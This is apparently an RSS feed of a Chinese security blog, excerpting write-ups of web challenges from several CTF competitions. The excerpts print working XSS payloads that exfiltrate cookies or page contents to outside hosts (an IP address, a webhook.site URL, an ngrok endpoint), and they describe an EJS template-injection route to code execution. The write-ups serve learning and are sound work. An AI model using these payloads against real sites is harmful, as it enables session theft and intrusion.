<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on an4er&#39; blog</title>
    <link>http://blog.an4er.top/post/</link>
    <description>Recent content in Posts on an4er&#39; blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 31 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="http://blog.an4er.top/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ACTF2023 WP</title>
      <link>http://blog.an4er.top/post/actf_wp/</link>
      <pubDate>Tue, 31 Oct 2023 00:00:00 +0000</pubDate>
      
      <guid>http://blog.an4er.top/post/actf_wp/</guid>
      <description>周末看了下ACTF的题目，在这里做个记录
easy latex 题目起手先在bot里面看到了flag
可是被设置为了httpOnly，也就是我们不可能使用xss去获得flag，查看其应用路由。在vip中发现
它获取了请求中的cookie，将其重新拼装后发送请求，也就是我们的bot只要向vip 路由发送post请求就能拿其Cookie，但是我们需要外带的话，需要控制其username为我们监听的地址或者webhook。最后就是找个地方能触发JS脚本执行的地方，外带脚本如下
const url = &amp;#34;http://localhost:3000/login&amp;#34;; const requestBody = &amp;#34;username=http%3A%2F%2F49.232.214.202%3A5000%2F&amp;amp;password=add29f48a5ae410bd6e875c8cd1ab8b7&amp;#34;; fetch(url, { method: &amp;#34;POST&amp;#34;, // 设置请求头 headers: { &amp;#34;Host&amp;#34;: &amp;#34;localhost:3000&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;textml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;, &amp;#34;Accept-Language&amp;#34;: &amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;, &amp;#34;Accept-Encoding&amp;#34;: &amp;#34;gzip, deflate, br&amp;#34;, &amp;#34;Referer&amp;#34;: &amp;#34;http://localhost:3000/login&amp;#34;, &amp;#34;Content-Type&amp;#34;: &amp;#34;application/x-www-form-urlencoded&amp;#34;, &amp;#34;Content-Length&amp;#34;: requestBody.length.toString(), &amp;#34;Origin&amp;#34;: &amp;#34;http://localhost:3000&amp;#34;, &amp;#34;DNT&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;Connection&amp;#34;: &amp;#34;close&amp;#34;, &amp;#34;Upgrade-Insecure-Requests&amp;#34;: &amp;#34;1&amp;#34;, }, body: requestBody, }) .then(async (response) =&amp;gt; { await sleep(100); fetch(&amp;#39;http://localhost:3000/vip&amp;#39;, { method: &amp;#39;POST&amp;#39;, body: JSON.stringify({ code: &amp;#34;3672953f54673678&amp;#34; }), headers: { &amp;#39;Content-Type&amp;#39;: &amp;#39;application/json&amp;#39;, }, credentials: &amp;#39;include&amp;#39;, }); }); const sleep = (time) =&amp;gt; { return new Promise(resolve =&amp;gt; setTimeout(resolve, time)); }; 路由内可以造成XSS就两个点，一个preview一个note，但是note需要登录，看了下逻辑不太可能去绕过VIP，然后试了下在puppeteer中是可以使用.</description>
    </item>
    
    <item>
      <title>hxpCTF valentine WP</title>
      <link>http://blog.an4er.top/post/hxp_valentine/</link>
      <pubDate>Wed, 22 Mar 2023 00:00:00 +0000</pubDate>
      
      <guid>http://blog.an4er.top/post/hxp_valentine/</guid>
      <description>签到就算成功
challenge 题目关键过滤点在while循环检测ejs的模板语法，如果存在除了复制语法外则返回400
solve 首先查看ejs的渲染函数，根据注释和查看源码，可以知道shallowCopyFromList函数的作用是遍历data中的键值对，如果data中有键名为_OPTS_PASSABLE_WITH_DATA其中一个，则将其复制到opts中
所以我们现在可以通过data可控以下几个参数
var _OPTS_PASSABLE_WITH_DATA = [&amp;#39;delimiter&amp;#39;, &amp;#39;scope&amp;#39;, &amp;#39;context&amp;#39;, &amp;#39;debug&amp;#39;, &amp;#39;compileDebug&amp;#39;, &amp;#39;client&amp;#39;, &amp;#39;_with&amp;#39;, &amp;#39;rmWhitespace&amp;#39;, &amp;#39;strict&amp;#39;, &amp;#39;filename&amp;#39;, &amp;#39;async&amp;#39;]; 然后看了下delimiter是模板引擎中选择的控制符号，默认为%，也就是默认我们使用 &amp;lt;% %&amp;gt; 达到使用模板语句的效果，但是完美被前面的while给防御住了，但是我们只用传入的是&amp;lt;$ $&amp;gt;然后让模板引擎可以正常的解析的话我们就可以使用模板语句RCE了，如下是delimiter的复制所以我们的控制符号可以通过opts可控了
然后检测标签的地方在
完成绕过，最后避免一下缓存就可以了</description>
    </item>
    
    <item>
      <title>diceCTF2023 WP</title>
      <link>http://blog.an4er.top/post/dicectf/</link>
      <pubDate>Sun, 12 Feb 2023 00:00:00 +0000</pubDate>
      
      <guid>http://blog.an4er.top/post/dicectf/</guid>
      <description>jnotes 题目总体代码很短，有一个XSS的点，flag在cookie中，被设置为httpOnly，所以目的是偷取cookie。
因为唯一的回显点在后端会输出note这个cookie的值到前端，我们才能获得，所以突破点在后端，后端就是一个简单的javalin程序，我最后的尝试是想能不能根据编码的差别在存储cookie时，设置类似;的符号去混乱cookie的键值对，尝试失败，会抛出RFC协议不允许；作为cookie的值，后来也看了下javalin关于cookie的文档和源码调试，没发现啥点
复现发现javalin是基于jetty的，靠了、光顾着看javalin没看jetty。在/jetty-http/src/main/java/org/eclipse/jetty/http/CookieCutter.java中，看到了jetty是这么解析接收到的cookie的，如果遇到&amp;quot;，则到&amp;quot;结束的当作一个值
因为note也是httpOnly的，所以也无法使用js去设置它的值，这里利用document.cookie=&#39;=note=&amp;quot;;path=//&#39;;创建键为空，值为note的cookie，发送时也就是 note=&amp;quot;....这里为了让note在最前面以可以覆盖掉后面的值所以让path的路径较长与FLAG
Cookies with longer path are listed before cookies with shorter path. Cookies which are edited least recently are listed before cookies which are edited most recently. 引用及payload来自https://github.com/RohitNarayananM/blog/tree/main/dicectf23-writeups/jnotes
&amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://jnotes.mc.ax/create&amp;#34;&amp;gt; &amp;lt;input id=&amp;#34;p&amp;#34; name=&amp;#34;note&amp;#34; value=&amp;#34;&amp;#34; &amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.querySelector(&amp;#34;#p&amp;#34;).value = `&amp;lt;/textarea&amp;gt; &amp;lt;\x73cript&amp;gt; document.cookie=&amp;#39;=note=&amp;#34;;path=//&amp;#39;; const frame = document.createElement(&amp;#39;iframe&amp;#39;); frame.src = &amp;#34;https://jnotes.mc.ax//&amp;#34;; document.body.appendChild(frame); frame.onload = () =&amp;gt; { navigator.sendBeacon(&amp;#34;https://webhook.site/5dd13816-1676-4a89-86d8-f98dab51e720&amp;#34;,frame.contentWindow.document.body.innerHTML); } &amp;lt;/\x73cript&amp;gt;`; document.forms[0].submit(); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; offical https://blog.</description>
    </item>
    
    <item>
      <title>idekCTF 2022 XSS</title>
      <link>http://blog.an4er.top/post/idekxss/</link>
      <pubDate>Wed, 25 Jan 2023 00:00:00 +0000</pubDate>
      
      <guid>http://blog.an4er.top/post/idekxss/</guid>
      <description>JSONBeautifier 从@zeyu2001师傅的payload学习赛中卡住的相关基础知识后自己尝试复现
{&amp;#34;x&amp;#34;:&amp;#34;&amp;lt;/pre&amp;gt;&amp;lt;iframe name=&amp;#39;fetch(&amp;amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;amp;quot;+document.cookie)&amp;#39; srcdoc=&amp;#39;&amp;lt;iframe name=config srcdoc=&amp;amp;#039;&amp;lt;head&amp;gt;&amp;lt;title id=debug&amp;gt;test&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;frameset id=opts cols=x:eval(/*, */name)//&amp;gt;&amp;lt;/frameset&amp;gt;&amp;amp;#039;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;div id=json-input&amp;gt;{&amp;amp;quot;x&amp;amp;quot;:&amp;amp;quot*/name)//&amp;amp;quot}&amp;lt;/div&amp;gt;&amp;lt;script src=static/js/main.js&amp;gt;&amp;lt;/script&amp;gt;&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#34;} 源码不多，简单看一下源码，一个flask应用为服务添加CSP：
response.headers[&amp;#39;Content-Security-Policy&amp;#39;] = &amp;#34;script-src &amp;#39;unsafe-eval&amp;#39; &amp;#39;self&amp;#39;; object-src &amp;#39;none&amp;#39;;&amp;#34; 这允许我们使用同源的JS文件和eval函数，然后有个main.js文件，关键代码如下：
userJson = JSON.parse(inputBox.textContent); const cols = this.config?.opts?.cols || defaults.opts.cols; output = JSON.stringify(userJson, null, cols); if(this.config?.debug || defaults.debug){ eval(`beautified = ${output}`); return beautified; }; outputBox.innerHTML = `&amp;lt;pre&amp;gt;${output}&amp;lt;/pre&amp;gt;` 因为我们的最终目的是XSS，所以我们需要进入eval函数，也就是需要给this.config.debug赋值，而且下面outputBox.innerHTML的赋值中的output可控，JSON.stringify的第三个参数可控的话可以导致逃逸出字符串
我们可以将&amp;lt;pre&amp;gt;标签闭合，然后就可以插入任意html，比赛的时候没想到DOM clobbering，赛后学习一下
https://portswigger.net/research/dom-clobbering-strikes-back
https://portswigger.net/web-security/dom-based/dom-clobbering
在文中提到超过三层的时候可以使用
&amp;lt;iframe name=a srcdoc=&amp;#34; &amp;lt;iframe srcdoc=&amp;#39;&amp;lt;a id=c name=d href=cid:Clobbered&amp;gt;test&amp;lt;/a&amp;gt;&amp;lt;a id=c&amp;gt;&amp;#39; name=b&amp;gt;&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;script&amp;gt;setTimeout(()=&amp;gt;alert(a.b.c.d),500)&amp;lt;/script&amp;gt; 因为我们只需要三层，所以我尝试简单改造一下
&amp;lt;iframe name=a srcdoc=&amp;#34; &amp;lt;iframe srcdoc=&amp;#39;&amp;lt;a id=opts name=cols href=cid:Clobbered&amp;gt;test&amp;lt;/a&amp;gt;&amp;lt;a id=opts&amp;gt;&amp;#39; name=config&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=.</description>
    </item>
    
  </channel>
</rss>
